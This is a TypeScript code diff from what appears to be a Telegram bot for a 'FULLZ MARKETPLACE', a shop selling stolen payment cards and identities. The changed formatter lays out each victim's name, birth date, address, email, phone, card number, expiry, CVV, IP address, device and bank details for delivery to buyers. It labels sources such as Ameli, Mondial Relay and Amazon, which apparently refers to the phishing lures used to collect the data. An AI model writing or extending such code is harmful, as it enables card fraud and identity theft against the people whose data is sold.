@@ -13,55 +13,109 @@ export interface CardDelivery {
   data: string
   meta?: {
     bin?: string
+    bank?: string
+    network?: string
+    level?: string
+    type?: string
     device?: string
+    source?: string
     ddn?: string
     age?: string
     cp?: string
   }
 }
 
-function escHtml(s: string) {
+function escHtml(s: string): string {
   return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+}
+
+function section(title: string, fields: Array<[string, string | undefined]>): string {
+  const filled = fields.filter(([, v]) => v)
+  if (!filled.length) return ''
+  const rows = filled.map(([label, val], i) => {
+    const branch = i === filled.length - 1 ? '┗' : '┣'
+    return `${branch} ${label}: ${escHtml(val!)}`
+  })
+  return `${title}\n${rows.join('\n')}`
+}
+
+const SOURCE_LABEL: Record<string, string> = {
+  AMELI: 'Ameli',
+  MONDIAL_RELAY: 'Mondial Relay',
+  AMAZON: 'Amazon',
+  OTHER: 'Autre',
 }
 
 function formatCardBlock(c: CardDelivery, idx: number): string {
   const m = c.meta ?? {}
-  const lines: string[] = []
 
-  lines.push(`<b>${idx + 1}. ${escHtml(c.productName)}</b>`)
+  // Try to parse fullData as JSON for structured fields
+  let d: Record<string, string> = {}
+  try { d = JSON.parse(c.data) } catch {}
+  const isJson = Object.keys(d).length > 0
 
-  const metaLine: string[] = []
-  if (m.device === 'IPHONE') metaLine.push('🍎 iPhone')
-  else if (m.device === 'ANDROID') metaLine.push('🤖 Android')
-  if (m.ddn) metaLine.push(`🎂 ${m.ddn}`)
-  if (m.age) metaLine.push(`${m.age} ans`)
-  if (m.cp) metaLine.push(`📍 ${m.cp}`)
-  if (metaLine.length) lines.push(metaLine.join('  ·  '))
+  const parts: string[] = []
 
-  lines.push('')
+  parts.push(`🛍️ <b>Carte ${idx + 1} — ${escHtml(c.productName)}</b>`)
 
-  // Format raw data: if key: value lines → bold keys, else raw code block
-  const dataLines = c.data.split('\n')
-  const isKeyValue = dataLines.every(l => l.includes(':'))
-  if (isKeyValue) {
-    for (const l of dataLines) {
-      const sep = l.indexOf(':')
-      if (sep === -1) { lines.push(`<code>${escHtml(l)}</code>`); continue }
-      const key = escHtml(l.slice(0, sep).trim())
-      const val = escHtml(l.slice(sep + 1).trim())
-      lines.push(`<b>${key}</b> : <code>${val}</code>`)
-    }
+  // Billing
+  if (isJson) {
+    const billing = section('🥽 <b>Billing</b>', [
+      ['👤 Nom Complet', d.nom],
+      ['🎂 Date de Naissance', d.ddn ?? m.ddn],
+      ['🏙️ Ville', d.ville],
+      ['🏠 Adresse', d.adresse],
+      ['📧 Email', d.email],
+      ['📞 Téléphone', d.telephone],
+    ])
+    if (billing) parts.push(billing)
+
+    // Carte
+    const carte = section('💳 <b>Carte</b>', [
+      ['🧾 Titulaire', d.titulaire],
+      ['💳 Numéro', d.numero],
+      ['🕑 Expiration', d.expiration],
+      ['🔒 CVV', d.cvv],
+    ])
+    if (carte) parts.push(carte)
   } else {
-    lines.push(`<code>${escHtml(c.data)}</code>`)
+    // Fallback: raw data block
+    parts.push(`💳 <b>Données</b>\n<code>${escHtml(c.data)}</code>`)
   }
 
-  if (m.bin && m.bin.length >= 6) {
-    const curvUrl = `https://cardimages.imaginecurve.com/cards/${m.bin.slice(0, 6)}.png`
-    lines.push('')
-    lines.push(`🖼 <a href="${curvUrl}">Voir la carte →</a>`)
+  // Infos carte
+  const bin6 = m.bin?.slice(0, 6) ?? ''
+  const niveau = [m.network, m.level].filter(Boolean).join(' ')
+  const scanUrl = bin6 ? `cardimages.imaginecurve.com/cards/${bin6}.png` : undefined
+  const infos = section('🏦 <b>Infos carte</b>', [
+    ['🟪 Bin', m.bin],
+    ['🏦 Banque', m.bank],
+    ['🏷️ Niveau', niveau || undefined],
+    ['⚙️ Type', m.type],
+    ['💠 Scan', scanUrl ? `<a href="https://${scanUrl}">${scanUrl}</a>` : undefined],
+  ])
+  if (infos) parts.push(infos)
+
+  // Appareil
+  const deviceLabel = m.device === 'IPHONE' ? '🍎 iPhone'
+    : m.device === 'ANDROID' ? '🤖 Android'
+    : m.device === 'UNKNOWN' ? '❓ Inconnu'
+    : undefined
+  const appareil = section('💻 <b>Appareil</b>', [
+    ['🌐 IP', isJson ? d.ip : undefined],
+    ['🌟 Device', deviceLabel],
+  ])
+  if (appareil) parts.push(appareil)
+
+  // System / Source
+  if (m.source) {
+    parts.push(`🎨 <b>System</b>\n┗ 🏷️ Source: ${SOURCE_LABEL[m.source] ?? m.source}`)
   }
 
-  return lines.join('\n')
+  // Shop tag
+  parts.push(`\n<i>🔖 #FULLZ — Livré via FULLZ MARKETPLACE</i>`)
+
+  return parts.join('\n\n')
 }
 
 export async function deliverCards(
@@ -70,9 +124,10 @@ export async function deliverCards(
   cards: CardDelivery[]
 ): Promise<void> {
   if (cards.length === 0) return
-  const sep = '\n\n──────────────────────\n\n'
-  const body = cards.map((c, i) => formatCardBlock(c, i)).join(sep)
-  const message = `🃏 <b>Commande #${orderId} — Livraison</b>\n\n${body}`
+  const divider = '\n\n━━━━━━━━━━━━━━━━━━━━\n\n'
+  const header = `🃏 <b>Commande #${orderId} — Livraison</b>`
+  const body = cards.map((c, i) => formatCardBlock(c, i)).join(divider)
+  const message = `${header}\n\n━━━━━━━━━━━━━━━━━━━━\n\n${body}`
   try {
     await bot.api.sendMessage(telegramId, message, {
       parse_mode: 'HTML',
@@ -99,7 +154,6 @@ export async function notifyOrderStatus(
 ): Promise<void> {
   const buildMessage = STATUS_MESSAGES[status]
   if (!buildMessage) return
-
   try {
     await bot.api.sendMessage(telegramId, buildMessage(orderId, total))
   } catch (err) {
